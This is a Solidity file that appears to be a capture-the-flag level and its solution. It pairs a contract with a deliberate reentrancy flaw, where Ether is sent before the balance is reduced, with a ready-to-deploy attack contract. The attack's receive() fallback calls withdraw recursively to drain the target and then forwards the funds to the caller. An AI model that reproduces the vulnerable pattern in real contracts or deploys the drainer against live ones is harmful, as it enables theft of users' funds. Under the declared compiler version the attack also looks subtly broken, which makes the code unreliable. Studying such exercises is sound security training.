// SPDX-License-Identifier: MIT



pragma solidity 0.8.0;

contract Reentrance {
  
  mapping(address => uint) public balances;

  function donate(address _to) public payable {
    balances[_to] = balances[_to] + msg.value;
  }

  function balanceOf(address _who) public view returns (uint balance) {
    return balances[_who];
  }

  function withdraw(uint _amount) public {
    if(balances[msg.sender] >= _amount) {
      (bool result,) = msg.sender.call{value:_amount}("");
      require(result, "withdraw failed");
      // if(result) {
      //   _amount;
      // }
      balances[msg.sender] -= _amount;
    }
  }

  receive() external payable {}
}


contract ReentranceAttack {

  Reentrance target;
  uint targetValue = 1000000000000000 wei;

  constructor(address payable _target) payable {
    target = Reentrance(_target);
  }

  function attack() public payable {
    require(msg.value >= targetValue, "value less");
    target.donate{value: msg.value}(address(this));
    target.withdraw(msg.value);
  }

  function getBalance(address _target) view public returns(uint) {
    return _target.balance;
  }

  function getSelfBalance() view public returns(uint) {
    return getBalance(address(this));
  }

  receive() external payable {
    uint targetBalance = address(target).balance;
    if (targetBalance >= targetValue) {
      target.withdraw(targetValue);
    }
  }

  function withdraw() payable external {
        (bool sent,) = msg.sender.call{value: address(this).balance}("");
        require(sent);
    }
}
